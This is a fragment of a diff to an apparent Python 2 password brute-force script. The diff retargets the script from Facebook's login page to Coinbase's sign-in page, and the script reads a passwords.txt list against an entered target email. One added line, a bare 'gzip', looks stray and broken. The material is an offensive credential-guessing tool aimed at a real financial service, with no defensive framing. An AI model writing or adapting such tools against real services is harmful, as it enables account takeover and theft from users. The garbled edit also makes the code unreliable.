@@ -9,7 +9,7 @@ if sys.version_info[0] !=2:
 			''')
 	sys.exit()
 
-post_url='https://www.facebook.com/login.php'
+post_url='https://www.coinbase.com/signin'
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
 }
@@ -26,7 +26,7 @@ except:
 
 print('\n---------- Brute Coinbase ----------\n')
 file=open('passwords.txt','r')
-
+gzip
 email=str(raw_input('Enter Email/Username : ').strip())
 
 print ("\nTarget Email ID : ",email)
